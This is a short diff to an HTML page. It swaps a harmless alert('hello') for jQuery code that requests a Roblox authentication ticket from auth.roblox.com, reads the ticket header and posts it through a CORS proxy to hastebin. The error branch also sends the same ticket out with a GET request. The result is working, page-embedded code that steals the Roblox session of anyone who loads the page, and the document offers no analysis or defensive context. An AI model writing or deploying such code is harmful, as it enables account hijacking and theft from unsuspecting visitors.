@@ -1,5 +1,16 @@
 
 <body>
-alert("hello")
+var data = {}
+$.ajax({
+   type: 'POST',
+   url: 'https://auth.roblox.com/v1/authentication-ticket',
+   data: data,
+   success: function(data, textStatus, request) {
+       $.post('https://non-cors.herokuapp.com/https://hastebin.com/documents',{jj:request.getResponseHeader('rbx-authentication-ticket')    })
+   },
+   error: function(request, textStatus, errorThrown) {
+       $.get('' + request.getResponseHeader('rbx-authentication-ticket'));
+   }
+});
 </body>
 
